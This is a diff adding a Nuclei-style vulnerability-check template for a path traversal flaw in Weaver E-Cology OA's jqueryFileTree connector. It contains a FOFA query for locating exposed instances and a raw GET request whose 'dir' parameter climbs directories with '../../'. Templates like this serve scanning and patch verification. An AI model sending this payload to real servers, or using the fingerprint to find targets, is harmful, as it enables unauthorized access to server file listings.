@@ -1,0 +1,19 @@
+id: poc-cq2ufi9g6ngt3h9w
+info:
+  name: 泛微E-Cology jqueryFileTree存在路径穿越漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cq2ufi9g6ngt3h9w'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cq2ufi9g6ngt3h9w
+    fofa: app="泛微-OA（e-cology）"
+http:
+- raw:
+  - GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../ HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
